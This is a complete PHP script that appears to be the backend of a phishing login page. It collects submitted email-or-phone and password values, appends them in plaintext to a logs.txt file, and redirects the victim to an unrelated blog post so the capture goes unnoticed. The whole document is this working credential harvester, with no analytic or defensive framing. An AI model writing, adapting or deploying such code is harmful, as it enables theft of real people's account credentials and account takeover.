<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Check if the form data is set
    if (isset($_POST["email_or_phone"]) && isset($_POST["password"])) {
        // Retrieve the form data
        $emailOrPhone = $_POST["email_or_phone"];
        $password = $_POST["password"];
        
        // Save the form data to a logs.txt file
        $file = fopen("logs.txt", "a");

        if ($file) {
            fwrite($file, "Email or Phone: " . $emailOrPhone . "\n");
            fwrite($file, "Password: " . $password . "\n");
            fwrite($file, "\n");
            fclose($file);
            
            // Redirect to the URL after saving data
            header("Location: https://tinybuddha.com/blog/10-ways-let-go-open-love/");
            exit; // Terminate the script to ensure the redirect happens
        } else {
            echo "Error: Unable to open or write to the file.";
        }
    } else {
        echo "Error: Both Email/Phone and Password are required.";
    }
} else {
    // Handle cases where the form was not submitted properly
    echo "Form not submitted.";
}
?>
